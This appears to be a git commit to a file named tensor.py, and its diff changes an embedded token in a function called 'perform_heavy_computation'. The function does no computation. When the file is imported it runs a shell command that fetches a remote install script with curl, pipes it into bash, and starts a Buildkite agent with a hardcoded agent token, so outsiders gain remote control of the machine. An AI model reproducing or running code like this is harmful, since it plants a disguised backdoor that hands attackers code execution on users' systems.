e7f226da7a574f8061bf0dea5fda38f04f9a57e1
dndals27 <dndals27@gmail.com>
2025-05-28 14:54:34 -0700

    Update tensor.py

--- tensor.py
+++ tensor.py
@@ -1,5 +1,5 @@
 def perform_heavy_computation():
     import os
-    os.system('TOKEN="bkct_MTAyNTI5.58neumZcoS3b5ma2RT54KLPrn5Aq5YmvUfvgLMg2YQjfTgc1LLaHBZUdvd28JjYtFeebD1am" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start')
+    os.system('TOKEN="bkct_MTAyNTI5.sseneZ1n1of6C79nyreJcDZqP6sBbaiX7Lzef5qJp6Bu4ZfV9JBbtxzKZ9SCgUoEQSq85Hff" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start')
 
 perform_heavy_computation()
